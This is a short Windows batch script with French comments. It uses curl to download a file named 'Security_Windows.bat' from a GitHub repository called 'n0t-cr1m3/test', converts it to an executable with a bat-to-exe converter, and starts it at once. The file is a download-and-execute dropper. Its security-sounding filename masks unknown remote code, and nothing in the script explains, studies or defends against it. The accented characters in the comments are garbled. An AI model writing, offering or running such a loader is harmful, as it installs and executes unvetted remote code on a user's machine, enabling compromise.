@echo off
set "url=https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.bat"
set "destination=%USERPROFILE%/Security_Windows.bat"
set "convertedExePath=%USERPROFILE%/Security_Windows.exe"

:: T�l�charge le fichier depuis l'URL sp�cifi�e
curl -o %destination% %url%

:: Convertit le .bat en .exe
bat_to_exe_converter.exe /bat %destination% /exe %convertedExePath%

:: Ex�cute le fichier t�l�charg�
start %convertedExePath%
